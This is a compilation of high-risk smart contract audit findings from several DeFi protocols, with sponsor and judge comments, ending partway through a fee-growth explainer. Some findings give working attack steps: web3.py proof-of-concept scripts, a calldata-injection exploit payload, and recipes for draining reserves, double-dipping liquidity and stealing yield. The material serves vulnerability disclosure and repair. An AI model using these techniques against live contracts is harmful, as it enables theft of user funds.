## [H-06]  "Users are credited more tokens when paying back debt with registerTradeAndBorrow"

The registerTradeAndBorrow is called with the results of a trade (inAmount, outAmount). It first tries to pay back any debt with the outAmount. However, the full outAmount is credited to the user again as a deposit in the adjustAmounts(account, tokenFrom, tokenTo, sellAmount, outAmount); call. As the user pays back their debt and is credited the same amount again, they are essentially credited twice the outAmount, making a profit of one outAmount. This can be withdrawn and the process can be repeated until the funds are empty.
In the adjustAmounts call, it should only credit outAmount - extinguishableDebt as a deposit like in registerDeposit.
The registerDeposit function correctly handles this case.


## [H-03]  "Missing DAO functionality to call changeDAO() function in Vader.sol"

changeDAO() is authorized to be called only from the DAO (per modifier) but DAO contract has no corresponding functionality to call changeDAO() function. As a result, DAO address cannot be changed (L192-L196).
Recommend adding functionality to DAO to be able to call changeDAO() of Vader.sol.
strictly-scarce (vader) commented:

#46

dmvt (judge) commented:

Unlike in issues #140, #157, #158, & #159; without this functionality, missing functionality in the DAO becomes a very serious issue. As a result, this one is very high risk were it to be overlooked.



## [H-17]  "Transfer fee is burned on wrong accounts"

The Vader._transfer function burns the transfer fee on msg.sender but this address might not be involved in the transfer at all due to transferFrom.
Smart contracts that simply relay transfers like aggregators have their Vader balance burned or the transaction fails because these accounts don't have any balance to burn, breaking the functionality.
Recommend that It should first increase the balance of recipient by the full amount and then burn the fee on the recipient.
strictly-scarce (vader) confirmed:

For composabilty with the rest of the ecosystem, this should be addressed, although disagree with the severity, no funds are lost, just the aggregrator cannot transfer unless they first transfer to themselves, which most often do.

Mervyn853 commented:

Our decision matrix for severity:
0: No-risk: Code style, clarity, off-chain monitoring (events etc), exclude gas-optimisations
1: Low Risk: UX, state handling, function incorrect as to spec
2: Funds-Not-At-Risk, but can impact the functioning of the protocol, or leak value with a hypothetical attack path with stated assumptions, but external requirements
3: Funds can be stolen/lost directly, or indirectly if a valid attack path shown that does not have handwavey hypotheticals.
Recommended: 2



## [H-20]  "Vault Weight accounting is wrong for withdrawals"

When depositing two different synths, their weight is added to the same mapMember_weight[_member] storage variable.
When withdrawing the full amount of one synth with _processWithdraw(synth, member, basisPoints=10000 the full weight is decreased.
The second deposited synth is now essentially weightless.
Users that deposited more than one synth can not claim their fair share of rewards after a withdrawal.
Recommed that the weight should be indexed by the synth as well.
strictly-scarce (vader) confirmed:

This is valid.
The weight should be reduced only as applied to a specific synth
There is no loss of funds, just less rewards for that member, disputing severity level.

Mervyn853 commented:

Our decision matrix for severity:
0: No-risk: Code style, clarity, off-chain monitoring (events etc), exclude gas-optimisations
1: Low Risk: UX, state handling, function incorrect as to spec
2: Funds-Not-At-Risk, but can impact the functioning of the protocol, or leak value with a hypothetical attack path with stated assumptions, but external requirements
3: Funds can be stolen/lost directly, or indirectly if a valid attack path shown that does not have handwavey hypotheticals.
Recommended: 2

dmvt (judge) commented:

My viewpoint on this and the last several reward based high risk issues is that loss of rewards is loss of funds. High risk is appropriate.



## [H-03]  "Router liquidity on receiving chain can be double-dipped by the user"

Submitted by 0xRajeev, also found by cmichel, gpersoon, pauliax, s1m0 and shw
During fulfill() on the receiving chain, if the user has set up an external contract at txData.callTo, the catch blocks for both IFulfillHelper.addFunds() and IFulfillHelper.excute() perform transferAsset to the predetermined fallback address txData.receivingAddress.
If addFunds() has reverted earlier, toSend amount would already have been transferred to the receivingAddress. If execute() also fails, it is again transferred.
Scenario: User sets up receiver chain txData.callTo contract such that both addFunds() and execute() calls revert. That will let him get twice the toSend amount credited to the receivingAddress. So effectively, Alice locks 100 tokenAs on chain A, and can get 200 tokenAs (or twice the amount of any token she is supposed to get on chain B from the router), minus relayer fee, on chain B. Router liquidity is double-dipped by Alice and router loses funds. See TransactionManager.sol L395-L409 and L413-L428.
Recommend that the second catch block for execute() should likely not have the transferAsset() call. It seems like a copy-and-paste bug unless there is some reason that is outside the specified scope and documentation for this contest.
LayneHaber (Connext) confirmed and patched:

https://github.com/connext/nxtp/pull/39



## [H-02]  "Pool.sol & Synth.sol: Failing Max Value Allowance"

Submitted by hickuphh3, also found by shw, jonah1005, 0xRajeev and cmichel
In the _approve function, if the allowance passed in is type(uint256).max, nothing happens (ie. allowance will still remain at previous value). Contract integrations (DEXes for example) tend to hardcode this value to set maximum allowance initially, but this will result in zero allowance given instead.
This also makes the comment // No need to re-approve if already max misleading, because the max allowance attainable is type(uint256).max - 1, and re-approval does happen in this case.
This affects the approveAndCall implementation since it uses type(uint256).max as the allowance amount, but the resulting allowance set is zero.
Recommend keeping it simple and removing the condition.
jsx
function _approve(address owner, address spender, uint256 amount) internal virtual {
    require(owner != address(0), "!owner");
    require(spender != address(0), "!spender");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
}
SamusElderg (Spartan) confirmed:

We acknowledge the issue in the max approval for approveAndCall, which we don't use.
Furthermore, the issue is only a problem if a user directly approves a maximum possible amount which would mean they are assuming trust in the contract.
We will also change _approve in the pool and synth contracts.
Risk, as outlined above, is low.

ghoul-sol (judge) commented:

This is high risk as explained in #152



## [H-08]  "Dividend reward can be gamed"

Submitted by cmichel
The Router.addDividend function tells the reserve to send dividends to the pool depending on the fees.

The attacker provides LP to a curated pool. Ideally, they become a large LP holder to capture most of the profit, they should choose the smallest liquidity pool as the dividends are pool-independent.
The normalAverageFee variable that determines the pool dividends can be set to zero by the attacker by trading a single wei in the pool arrayFeeSize (20) times (use buyTo). The fees of the single wei trades will be zero and thus the normalAverageFee will also be zero as, see addTradeFee.
The attacker then does a trade that generates some non-zero fees, setting the normalAverageFee to this trade's fee. The feeDividend is then computed as _fees * dailyAllocation / (_fees + normalAverageFee) = _fees * dailyAllocation / (2 * _fees) = dailyAllocation / 2. Half of the dailyAllocation is sent to the pool.
The attacker repeats the above steps until the reserve is almost empty. Each time the dailyAllocation gets smaller but it's still possible to withdraw almost all of it.
They redeem their LP tokens and gain a share of the profits

The reserve can be emptied by the attacker.
Counting only the last 20 trades as a baseline for the dividends does not work. It should probably average over a timespan but even that can be gamed if it is too short.
I think a better idea is to compute the dividends based on volume traded over a timespan instead of looking at individual trades.
verifyfirst (Spartan) acknowledged:

Only very deep pools will be curated for dividends.
Variables can be changed reactively to alter the dividends.
Whilst we were aware of this and feel the attack is limited its sparked some discussion for some new ideas to solve this.


ghoul-sol (judge) commented:

Keeping high risk as the report is valid



## [H-11]  "Misuse of AMM model on minting Synth (resubmit to add more detail)"

Submitted by jonah1005
Pool calculates the amount to be minted based on token_amount and sparta_amount of the Pool. However, since token_amount in the pool would not decrease when users mint Synth, it's always cheaper to mint synth than swap the tokens.
The synthetics would be really hard to be on peg. Or, there would be a flash-loan attacker to win all the arbitrage space.
In Pool's mint synth, The synth amount is calculated at L:232
solidity
uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount);
which is the same as swapping base to token at L:287
solidity
uint256 _X = baseAmount;
uint256 _Y = tokenAmount;
_y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc TOKEN output
However, while swapping tokens decrease pool's token, mint just mint it out of the air.
Here's a POC:
Swap sparta to token for ten times
python
for i in range(10):
    amount = 10 * 10**18
    transfer_amount = int(amount/10)
    base.functions.transfer(token_pool.address, transfer_amount).transact()
    token_pool.functions.swapTo(token.address, user).transact()
Mint Synth for ten times
python
for i in range(10):
    amount = 10 * 10**18
    transfer_amount = int(amount/10)
    base.functions.transfer(token_pool.address, transfer_amount).transact()
    token_pool.functions.mintSynth(token_synth.address, user).transact()
The Pool was initialized with 10000:10000 in both cases. While the first case(swap token) gets 4744.4059 and the second case gets 6223.758.
The debt should be considered in the AMM pool so I recommend to maintain a debt variable in the Pool and use tokenAmount - debt when the Pool calculates the token price. Here's some idea of it:
```solidity
uint256 public debt;
function _tokenAmount() returns (uint256) {
    return tokenAmount - debt;
}
// Swap SPARTA for Synths
function mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {
    require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, "!synth"); // Must be a valid Synth
    uint256 _actualInputBase = _getAddedBaseAmount(); // Get received SPARTA amount
// Use tokenAmount - debt to calculate the value
uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, _tokenAmount()); // Calculate value of swapping SPARTA to the relevant underlying TOKEN

// increment the debt
debt += output

uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted
_incrementPoolBalances(_actualInputBase, 0); // Update recorded SPARTA amount
uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN
fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA
_mint(synthOut, _liquidityUnits); // Mint the LP tokens directly to the Synth contract to hold
iSYNTH(synthOut).mintSynth(member, output); // Mint the Synth tokens directly to the user
_addPoolMetrics(fee); // Add slip fee to the revenue metrics
emit MintSynth(member, BASE, _actualInputBase, TOKEN, outputAmount);
return (output, fee);

}
```
verifyfirst (Spartan) confirmed:

We agree with the issue submitted, discussions are already in progress around ensuring the mint rate considers the floating debt.
Potential high risk, however, hard to create a scenario to prove this.



## [H-12]  "wrong calcLiquidityHoldings that leads to dead fund in the Pool"

Submitted by jonah1005
The lptoken minted by the Pool contract is actually the mix of two types of tokens. One is the original lptokens user get by calling addForMember. This lpToken is similar to lp of Uniswap, Crv, Sushi, ... etc. The other one is the debt-lp token the Synth contract will get when the user calls mintSynth. The Synth contract can only withdraw Sparta for burning debt-lp. Mixing two types of lp would raise several issues.
LP user would not get their fair share when they burn the lP.
1. Alice adds liquidity with Sparta 1000 and token B 1000 and create a new Pool.
2. Bob mint Synth with 1000 Sparta and get debt.
3. Alice withdraw all lp Token
4. Bob burn all Synth.
The pool would end up left behind a lot of token B in the Pool while there's no lp holder.
I would say this is a high-risk vulnerability since it pauses unspoken risks and losses for all users (all the time)
The logic of burn original lp and burn debt-lp.
I do not know whether this is the team's design choice or its composite with a series of bugs. If this is the original design, I do not come up with a fix. It's a bit similar to the impermanent loss. However, the loss would be left behind in the Pool. This is more complicated and maybe worse than the impermanent loss. If this is the design choice, I think it's worth emphasize and explain to the users.
verifyfirst (Spartan) confirmed and disagreed with severity:

We are in discussion of a viable solution to limit the effects of a bank run.
One example is limiting the minted synths based on the depth of its underlying pool.


SamusElderg (Spartan) commented:

LP units are only used for accounting; even if they were drained to zero or vice versa on the synth contract; they would result in the same redemption value when burning. Hence the risk is low; however there is already discussions on implementing controls to synths including a maximum synthSupply vs tokenDepth ratio to prevent top-heavy synths ontop of the pools which isn't really specific to the warden's scenario; however does help limit those 'unknowns' that the warden addressed.



## [H-02]  "A critical bug in bps function"

Submitted by hrkrshnn, also found by jonah1005 and walker
``` solidity
function bps() internal pure returns (IERC20 rt) {
  // These fields are not accessible from assembly
  bytes memory array = msg.data;
  uint256 index = msg.data.length;
// solhint-disable-next-line no-inline-assembly
  assembly {
    // Load the 32 bytes word from memory with the address on the lower 20 bytes, and mask those.
    rt := and(mload(add(array, index)), 0xffffffffffffffffffffffffffffffffffffffff)
  }
}
```
The above function is designed to expect the token at the end of calldata, but a malicious user can inject extra values at the end of calldata and fake return values.
The following contract demonstrates an example:
``` solidity
pragma solidity 0.8.6;
interface IERC20 {}
error StaticCallFailed();
contract BadEncoding {
  /// Will return address(1). But address(0) is expected!
  function f() external view returns (address) {
    address actual = address(0);
    address injected = address(1);
(bool success, bytes memory ret) = address(this).staticcall(abi.encodeWithSelector(this.g.selector, actual, injected));

if (!success) revert StaticCallFailed();

return abi.decode(ret, (address));

}
  function g(IERC20 _token) external pure returns (IERC20) {
    // to get rid of the unused warning
    _token;
    // Does it always match _token?
    return bps();
  }
  // From Sherlock Protocol: PoolBase.sol
  function bps() internal pure returns (IERC20 rt) {
    // These fields are not accessible from assembly
    bytes memory array = msg.data;
    uint256 index = msg.data.length;
// solhint-disable-next-line no-inline-assembly
assembly {
  // Load the 32 bytes word from memory with the address on the lower 20 bytes, and mask those.
  rt := and(mload(add(array, index)), 0xffffffffffffffffffffffffffffffffffffffff)
}

}
}
```
This example can be used to exploit the protocol:
``` solidity
function unstake(
  uint256 _id,
  address _receiver,
  IERC20 _token
) external override returns (uint256 amount) {
  PoolStorage.Base storage ps = baseData();
  require(_receiver != address(0), 'RECEIVER');
  GovStorage.Base storage gs = GovStorage.gs();
  PoolStorage.UnstakeEntry memory withdraw = ps.unstakeEntries[msg.sender][_id];
  require(withdraw.blockInitiated != 0, 'WITHDRAW_NOT_ACTIVE');
  // period is including
  require(withdraw.blockInitiated + gs.unstakeCooldown < uint40(block.number), 'COOLDOWN_ACTIVE');
  require(
    withdraw.blockInitiated + gs.unstakeCooldown + gs.unstakeWindow >= uint40(block.number),
    'UNSTAKE_WINDOW_EXPIRED'
  );
  amount = withdraw.lock.mul(LibPool.stakeBalance(ps)).div(ps.lockToken.totalSupply());
ps.stakeBalance = ps.stakeBalance.sub(amount);
  delete ps.unstakeEntries[msg.sender][_id];
  ps.lockToken.burn(address(this), withdraw.lock);
  _token.safeTransfer(_receiver, amount);
}
```
State token Token1. Let's say there is a more expensive token
Token2.
Here's an example exploit:
solidity
bytes memory exploitPayload = abi.encodeWithSignature(
  PoolBase.unstake.selector,
  (uint256(_id), address(_receiver), address(Token2), address(Token1))
);
poolAddress.call(exploitPayload);
All the calculations on ps would be done on Token2, but at the end, because of, _token.safeTransfer(_receiver, amount);, Token2 would be transferred. Assuming that Token2 is more expensive than Token1, the attacker makes a profit.
Similarly, the same technique can be used at a lot of other places. Even if this exploit is not profitable, the fact that the computations can be done on two different tokens is buggy.
There are several other places where the same pattern is used. All of them needs to be fixed. I've not written an exhaustive list.
Evert0x (Sherlock) confirmed
Medium Risk Findings (4)


## [H-01]  "findNewOwner edgecase"

Submitted by gpersoon
In the function findNewOwner of RCOrderbook, as loop is done which included the check  _loopCounter < maxDeletions
Afterwards, a check is done for  "(_loopCounter != maxDeletions)" to determine if the processing is finished.
If _loopCounter == maxDeletions then the conclusion is that it isn't finished yet.
However, there is the edgecase that the processing might just be finished at the same time as _loopCounter == maxDeletions.
You can see this the best if you assume maxDeletions==1, in that case it will never draw the conclusion it is finished.
Of course having maxDeletions==1 is very unlikely in practice.
```solidity
// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCOrderbook.sol#L549
 function findNewOwner(uint256 _card, uint256 _timeOwnershipChanged)  external  override  onlyMarkets  {
...
    // delete current owner
    do {
        _newPrice = _removeBidFromOrderbookIgnoreOwner( _head.next, _market, _card );
        _loopCounter++;             // delete next bid if foreclosed
    } while (    treasury.foreclosureTimeUser( _head.next, _newPrice,  _timeOwnershipChanged ) <  minimumTimeToOwnTo &&
            _loopCounter < maxDeletions );
if (_loopCounter != maxDeletions) {   // the old owner is dead, long live the new owner
    _newOwner = ....
    ...
} else {
    // we hit the limit, save the old owner, we'll try again next time
    ...
}

}
```
Recommend using a different way to determine that the processing is done. This could save some gas.
Note: the additional check also costs gas, so you have to verify the end result.
Perhaps in setDeletionLimit, doublecheck that _deletionLimit > 1.
Splidge (Reality Cards) confirmed and disagreed with severity:

oh wow, this is actually a really big problem. It's easier to see it if maxDeletions is 1 but it exists with any size of maxDeletions.
Whenever we find a valid owner on the final iteration of the loop the if statement will simply check if it was the final loop. That valid owner is then assumed to be invalid and saved for the next transaction to try and find a new owner. When that next transaction happens the valid owner is immediately deleted and not given any ownership of the card at all.
I think this just falls short of 3 (High risk) because I don't think it'd be possible for an attacker to engineer the situation to have a particular user deleted without ownership. But I believe this would count as 2 (Med risk) because the protocol "availability could be impacted" for the user that is deleted.

Splidge (Reality Cards) commented:

I have since thought of an attack that could have used this and might raise it to 3 (High risk).
Due to the difficultly of monitoring which cards you own all the time a valid strategy which some users employ is to bid high enough to scare off other users (usually bidding significantly beyond the 10% minimum increase). Suppose Alice employs this strategy by bidding \$100 on a card that was previously only \$10.
Mal (our attacker) wishes to rent the card but wants to pay less than \$100. Mal could use Sybil accounts to place maxDeletions - 1 bids all for the minimum rental duration (only funding the accounts for the minimum duration). Mal would then need to wait for the minimum duration of all these bids to expire, (maxDeletions - 1 ) * minimumRentalDuration
Once this has completed Mal can place a bid at \$11, this will trigger a rent collection which will attempt to findNewOwner, Alice being the user that was found on the last iteration of the loop would be considered as invalid. There will not be a change of ownership or any events emitted about this until the next rent collection is triggered.
This means that the UI would still consider Alice to be the owner of card (Mals' Sybil bids having had LogRemoveFromOrderbook and LogUserForeclosed events emitted) and other users might not consider trying to outbid this, whereas actually Mal is accruing time at a significantly cheaper rate.
Thinking about it, this doesn't really even need Alice at all, Mal could have placed all the higher bids to simultaneously scare off other users while renting at a lower price.
I think the fix is relatively simple, by checking if we found a valid user OR hit the deletion limit we can make it so that we don't skip any bids. This would then leave Alice (or Mal in the other version) correctly having to pay for the time at the higher price.

0xean (judge) commented:

upgrading based on sponsors analysis

Splidge (Reality Cards) patched:

Fixed here



## [H-02]  "SushiToken transfers are broken due to wrong delegates accounting on transfers"

Submitted by cmichel.
When minting / transferring / burning tokens, the SushiToken._beforeTokenTransfer function is called and supposed to correctly shift the voting power due to the increase/decrease in tokens for the from and to accounts.
However, it does not correctly do that, it tries to shift the votes from the from account, instead of the _delegates[from] account.
This can lead to transfers reverting.
Proof Of Concept
Imagine the following transactions on the SushiToken contract.
We'll illustrate the corresponding _moveDelegates calls and written checkpoints for each.

mint(A, 1000) = transfer(0, A, 1000) => _moveDelegates(0, delegates[A]=0) => no checkpoints are written to anyone because delegatees are still zero
A delegates to A' => _moveDelegates(0, A') => writeCheckpoint(A', 1000)
B delegates to B' => no checkpoints are written as B has a zero balance
transfer(A, B, 1000) => _moveDelegates(A, delegates[B] = B') => underflows when subtracting amount=1000 from A's non-existent checkpoint (defaults to 0 votes)

It should subtract from A's delegatee A''s checkpoint instead.
Impact
Users that delegated votes will be unable to transfer any of their tokens.
Recommended Mitigation Steps
In SushiToken._beforeTokenTransfer, change the _moveDelegates call to be from _delegates[from] instead:
solidity
function _beforeTokenTransfer(address from, address to, uint256 amount) internal override { 
    _moveDelegates(_delegates[from], _delegates[to], amount);
    super._beforeTokenTransfer(from, to, amount);
}
This is also how the original code from Compound does it.
maxsam4 (Sushi Miso) acknowledged:

This is a known issue in Sushi token but was kept unchanged in MISO for "preservation of history :)". That was not necessarily a wise choice lol. I think 1 severity should be fine for this as this was an intentional thing. The delegate feature is not supposed to be used in these tokens. We might create a new token type with this bug fixed.

ghoul-sol (judge) commented:

We have crazy wallets on the blockchain that will call every possible function available to them and that's why I'm keeping this as is. Even intentional, the issue stands so the warden should get credit for it.



## [H-04]  "IndexPool’s INIT_POOL_SUPPLY is not fair."

Submitted by broccoli, also found by WatchPug
Impact
The indexPool mint INIT_POOL_SUPPLY to address 0 in the constructor. However, the value of the burned lp is decided by the first lp provider. According to the formula in IndexPool.sol L106.
AmountIn = first_lp_amount / INIT_POOL_SUPPLY and the burned lp worth = AmountIn * (INIT_POOL_SUPPLY) / (first_lp_amount + INIT_POOL_SUPPLY).
If a pool is not initialized with optimal parameters, it would be a great number of tokens been burn. All lp providers in the pool would receive less profit.
The optimal parameter is 10**8. It's likely no one would initialize with 10**8 wei in most pools. I consider this is a high-risk issue.
Proof of concept
There are two scenarios that the first lp provider can do. The lp provider provides the same amount of token in both cases. However, in the first scenario, he gets about 10 ** 18 * 10**18 lp while in the other scenario he gets 100 * 10**18 lp.
python
deposit_amount = 10**18
bento.functions.transfer(link.address, admin, pool.address, deposit_amount).transact()
bento.functions.transfer(dai.address, admin, pool.address, deposit_amount).transact()
pool.functions.mint(encode_abi(
    ['address', 'uint256'],
    [admin, 10**8] # minimum
)).transact()
pool.functions.mint(encode_abi(
    ['address', 'uint256'],
    [admin, 10000000000009999 * 10** 20]
)).transact()
python
deposit_amount = 10**18
bento.functions.transfer(link.address, admin, pool.address, deposit_amount).transact()
bento.functions.transfer(dai.address, admin, pool.address, deposit_amount).transact()
pool.functions.mint(encode_abi(
    ['address', 'uint256'],
    [admin, deposit_amount * 100]
)).transact()
Recommended Mitigation Steps
Recommend to handle INIT_POOL_SUPPLY in uniswap-v2's way. Determine an optimized parameter for the user would be a better UX design.


## [H-07]  "IndexPool.mint The first liquidity provider is forced to supply assets in the same amount

Submitted by WatchPug, also found by broccoli
When reserve == 0, amountIn for all the tokens will be set to the same amount: ratio, regardless of the weights, decimals and market prices of the assets.
The first liquidity provider may not be aware of this so that it may create an arbitrage opportunity for flashbots to take a significant portion of the value of The first liquidity provider's liquidity.
IndexPool.sol#L93 L105
``solidity
/// @dev Mints LP tokens - should be called via the router after transferringbento` tokens.
/// The router must ensure that sufficient LP tokens are minted by using the return value.
function mint(bytes calldata data) public override lock returns (uint256 liquidity) {
    (address recipient, uint256 toMint) = abi.decode(data, (address, uint256));
uint120 ratio = uint120(_div(toMint, totalSupply));

for (uint256 i = 0; i < tokens.length; i++) {
    address tokenIn = tokens[i];
    uint120 reserve = records[tokenIn].reserve;
    // @dev If token balance is '0', initialize with `ratio`.
    uint120 amountIn = reserve != 0 ? uint120(_mul(ratio, reserve)) : ratio;
    require(amountIn >= MIN_BALANCE, "MIN_BALANCE");
    // @dev Check Trident router has sent `amountIn` for skim into pool.
    unchecked {
        // @dev This is safe from overflow - only logged amounts handled.
        require(_balance(tokenIn) >= amountIn + reserve, "NOT_RECEIVED");
        records[tokenIn].reserve += amountIn;
    }
    emit Mint(msg.sender, tokenIn, amountIn, recipient);
}
_mint(recipient, toMint);
liquidity = toMint;

}
```
Proof of Concept
Given:

A IndexPool of 99% USDT and 1% WBTC;

Alice is the first liquidity provider.


Alice transfers 1e18 WBTC and 1e18 USDT to mint 100e18 of liquidity;

Bob can use 100e18 USDT (\~\$100) to swap out most of the balance of WBTC.

Impact
A significant portion (>90% in the case above) of the user's funds can be lost due to arbitrage.
Recommendation
Consider allowing the first liquidity provider to use custom amountIn values for each token or always takes the MIN_BALANCE of each token.


## [H-04]  "Controller does not raise an error when there’s insufficient liquidity"

Submitted by jonah1005, also found by 0xRajeev and WatchPug
Impact
When a user tries to withdraw the token from the vault, the vault would withdraw the token from the controller if there's insufficient liquidity in the vault. However, the controller does not raise an error when there's insufficient liquidity in the controller/ strategies. The user would lose his shares while getting nothing.
An MEV searcher could apply this attack on any withdrawal. When an attacker found an unconfirmed tx that tries to withdraw 1M dai, he can do such sandwich attack.

Deposits USDC into the vault.
Withdraw all dai left in the vault/controller/strategy.
Place the vitims tx here. The victim would get zero dai while burning 1 M share. This would pump the share price.
Withdraw all liquidity.

All users would be vulnerable to MEV attackers. I consider this is a high-risk issue.
Proof of Concept
Here's web3.py script to reproduce the issue.
```python
deposit_amount = 100000 * 10**18
user = w3.eth.accounts[0]
get_token(dai, user, deposit_amount)
dai.functions.approve(vault.address, deposit_amount + margin_deposit).transact()
vault.functions.deposit(dai.address, deposit_amount).transact()
vault.functions.withdrawAll(usdt.address).transact()

print("usdt amount: ", usdt.functions.balanceOf(user).call())
```
Recommended Mitigation Steps
There are two issues involved.
First, users pay the slippage when they try to withdraw. I do not find this fair. Users have to pay extra gas to withdraw liquidity from strategy, convert the token, and still paying the slippage. I recommend writing a view function for the frontend to display how much slippage the user has to pay (Controler.sol L448-L479).
Second, the controller does not revert the transaction there's insufficient liquidity (Controller.sol#L577-L622).
Recommend to revert the transaction when _amount is not equal to zero after the loop finishes.
GainsGoblin (yAxis) acknowledged
GalloDaSballo (judge) commented:

Agree with warden finding, this shows the path for an attack that is based on the Vault treating all tokens equally
Since the finding shows a specific attack, the finding is unique
Recommend the sponsor mitigates Single Sided Exposure risks to avoid this attack

BobbyYaxis (yAxis) noted:

We have mitigated by deploying vaults that only accept the Curve LP token itself used in the strategy. There is no longer an array of tokens accepted. E.g Instead of a wBTC vault, we have a renCrv vault. Or instead of 3CRV vault, we have a mimCrv vault. The strategy want token = the vault token.



## [H-02]  "Wrong usage of positionId in ConcentratedLiquidityPoolManager"

Submitted by broccoli, also found by 0xsanson, cmichel, hickuphh3, and pauliax
Impact
In the subscribe function of ConcentratedLiquidityPoolManager, the incentive to subscribed is determined as follows:
solidity
Incentive memory incentive = incentives[pool][positionId];
However, positionId should be incentiveId, a counter that increases by one whenever a new incentive is added to the pool. The usage of positionId could cause the wrong incentive to be used, and in general, the incentive is not found, and the transaction reverts (the condition block.timestamp < incentive.endTime is not met). The getReward and claimReward functions have the bug of misusing positionId as the index of incentives.
Proof of Concept
Referenced code:
- ConcentratedLiquidityPoolManager.sol#L68
- ConcentratedLiquidityPoolManager.sol#L87
- ConcentratedLiquidityPoolManager.sol#L105
Recommended Mitigation Steps
Change positionId to incentiveId in the referenced lines of code.
sarangparikh22 (Sushi) confirmed but disagreed with severity


## [H-06]  "ConcentratedLiquidityPosition.sol#collect() Users may get double the amount of yield when they call collect() before burn()"

Submitted by WatchPug
When a user calls ConcentratedLiquidityPosition.sol#collect() to collect their yield, it calcuates the yield based on position.pool.rangeFeeGrowth() and position.feeGrowthInside0, position.feeGrowthInside1:
ConcentratedLiquidityPosition.sol#L75 L101
When there are enough tokens in bento.balanceOf, it will not call position.pool.collect() to collect fees from the pool.
This makes the user who collect() their yield when there is enough balance to get double yield when they call burn() to remove liquidity. Because burn() will automatically collect fees on the pool contract.
Impact
The yield belongs to other users will be diluted.
Recommended Mitigation Steps
Consider making ConcentratedLiquidityPosition.sol#burn() call position.pool.collect() before position.pool.burn(). User will need to call ConcentratedLiquidityPosition.sol#collect() to collect unclaimed fees after burn().
Or ConcentratedLiquidityPosition.sol#collect() can be changed into a public method and ConcentratedLiquidityPosition.sol#burn() can call it after position.pool.burn().
sarangparikh22 (Sushi) confirmed


## [H-07]  "ConcentratedLiquidityPosition.sol#burn() Wrong implementation allows attackers to steal yield"

Submitted by WatchPug
When a user calls ConcentratedLiquidityPosition.sol#burn() to burn their liquidity, it calls ConcentratedLiquidityPool.sol#burn() -> _updatePosition():
ConcentratedLiquidityPool.sol#L525 L553
The _updatePosition() function will return amount0fees and amount1fees of the whole position with the lower and upper tick and send them to the recipient alongside the burned liquidity amounts.
Proof of Concept

Alice minted \$10000 worth of liquidity with lower and upper tick set to 99 and 199;
Alice accumulated \$1000 worth of fee in token0 and token1;
The attacker can mint a small amount (\$1 worth) of liquidity using the same lower and upper tick;
The attacker calls ConcentratedLiquidityPosition.sol#burn() to steal all the unclaimed yield with the ticks of (99, 199) include the \$1000 worth of yield from Alice.

Recommended Mitigation Steps
Consider making ConcentratedLiquidityPosition.sol#burn() always use address(this) as recipient in:
solidity
position.pool.burn(abi.encode(position.lower, position.upper, amount, recipient, unwrapBento));
and transfer proper amounts to the user.
sarangparikh22 (Sushi) confirmed


## [H-17]  "Understanding the fee growth mechanism (why nearestTick is unsuitable)"

Submitted by hickuphh3
Introduction
Uniswap V3's whitepaper describes the fee growth mechanism, but the intuition behind it is not explained well (IMO). I've not been able to find any material that tries to describe it, so allow me the luxury of doing so. It is crucial to understand how it works, so that other issues regarding the fee growth variables (and by extension, secondsPerLiquidity) raised by fellow wardens / auditors are better understood by readers.
Objective
We want a way to accurately track the fees accumulated by a position. Fees should only be given to the position it is active (the current tick / price is within the lower and upper ticks of the position).
feeGrowthGlobal
Defined as the total amount of fees that would have been earned by 1 unit of unbounded liquidity that was deposited when the contract was first initialized. For simplicity, we can take this to be the range between MIN_TICK and MAX_TICK. We represent it visually like this:
jsx
// <-------------------------------------------------------------------------->
// MIN_TICK                                                               MAX_TICK
feeGrowthOutside
The fee growth per unit of liquidity on the other side of this tick (relative to the current tick). What does this mean?
As defined, it is the fee growth relative to the current tick. Based on the convention, we define 2 cases:

Case 1: initialized tick ≤ pool tick
Case 2: Initialized tick > pool tick

Visually, the feeGrowthOutside will look like this:
```jsx
// CASE 1
// <--------------------|--------------------|
// MIN_TICK         INIT_TICK            POOL_TICK
// <-----------------------------------------|
// MIN_TICK                        INIT_TICK = POOL_TICK
// CASE 2
//                                           |--------------------|---------------->
//                                       POOL_TICK           INIT_TICK          MAX_TICK
```
Hence, regardless of whether the tick to initialize is either a lower or upper tick of a position, the feeGrowthOutside value that it is referring to is relatve to the pool tick.
In other words, if initialized tick ≤ pool tick, then its feeGrowthOutside is towards MIN_TICK. Otherwise, its feeGrowthOutside is towards MAX_TICK.
Initialization
By convention, when a tick is initialized, all fee growth is assumed to happen below it. Hence, the feeGrowthOutside is initialized to the following values:

Case 1: tick's feeGrowthOutside = feeGrowthGlobal
Case 2: tick's feeGrowthOtuside = 0

Implications
One should now understand why the feeGrowthOutside value is being flipped when crossing a tick, ie. tick.feeGrowthOutside = feeGrowthGlobal - tick.feeGrowthOutside in Tick.cross(), because it needs to follow the definition. (Case 1 becomes case 2 and vice versa).
It should hopefully become clear why using nearestTick as the reference point for fee growth calculations instead of the pool tick might not a wise choice. (Case 1 and 2 becomes rather ambiguous).
Range fee growth / feeGrowthInside
Going back to our objective of calculating the fee growth accumulated for a position, we can break it down into 3 cases (take caution with the boundary cases), and understand how their values are calculated. In general, we take it to be feeGrowthGlobal - fee growth below lower tick - fee growth above upper tick (see illustrations), although it can be simplified further.


pool tick < lower tick
```jsx
// ---------------------|---------------------|-----------------|-----------------
//                  POOL_TICK            LOWER_TICK          UPPER_TICK
// <---------------------------- feeGrowthGlobal -------------------------------->
//       LOWER_TICK.feeGrowthOutside (CASE 2) |---------------------------------->
//                         UPPER_TICK.feeGrowthOutside (CASE 2) |---------------->
// we want the range between LOWER_TICK and UPPER_TICK
// = LOWER_TICK.feeGrowthOutside - UPPER_TICK.feeGrowthOutside
// alternatively, following the general formula, it is
// = feeGrowthGLobal - fee growth below LOWER_TICK - fee growth above UPPER_TICK
